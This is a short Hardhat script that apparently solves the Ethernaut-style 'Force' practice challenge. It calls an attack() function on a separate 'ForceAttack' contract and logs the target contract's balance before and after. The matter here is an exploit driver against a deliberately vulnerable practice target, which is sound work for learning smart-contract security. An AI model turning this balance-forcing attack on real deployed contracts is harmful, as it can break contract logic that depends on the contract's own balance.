import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0xB0f05d25e41FbC2b52013099ED9616f1206Ae21B"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Force", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("ForceAttack", ATTACK_ADDRESS, signer)

  console.log(await ethers.provider.getBalance(CONTRACT_ADDRESS))

  await attackContract.attack()

  console.log(await ethers.provider.getBalance(CONTRACT_ADDRESS))
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
